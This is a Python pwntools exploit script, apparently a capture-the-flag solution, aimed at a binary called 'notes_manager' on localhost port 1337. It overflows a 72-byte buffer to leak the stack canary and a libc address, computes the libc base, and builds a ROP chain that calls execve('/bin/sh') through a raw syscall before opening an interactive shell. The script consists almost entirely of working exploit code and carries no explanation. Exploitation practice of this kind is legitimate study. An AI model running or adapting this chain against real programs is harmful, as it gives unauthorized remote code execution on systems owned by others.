#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'notes_manager')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('localhost',1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

io.sendline(b'1')
sleep(1)
io.sendline(b'a'*72)
io.recvuntil(b"->")
io.recvline()
leak = io.recv(7)
log.warn(leak.hex())

io.sendline(b'1')
io.send(b'a' * (72+8+8-1)+b'\n')
io.recvuntil(b"->")
io.recvline()
an = io.recvuntil(b'Choos').replace(b'Choos', b'')
log.warn(an)
log.warn(f'LENGTH -> {len(an)}')
libc_start = u64(an.ljust(8,b'\x00'))
log.warn(f'LIBC START -> {libc_start:x}')

libc.address = libc_start - 171408
log.warn(f'LIBC -> {libc.address:x}')

rop = ROP(libc)
bin_sh = next(libc.search(b'/bin/sh\x00'))
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]

syscall = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

pl = b''
pl += b'a'*72
pl += b'\x00' + leak
pl += p64(0xdeadbeef)
pl += p64(ret)
pl += p64(pop_rax) + p64(59)
pl += p64(pop_rdi) + p64(bin_sh)
pl += p64(pop_rsi) + p64(0)
pl += p64(pop_rdx) + p64(0) + p64(0)
pl += p64(syscall)

io.sendline(b'1')
io.sendline(pl)

io.interactive()

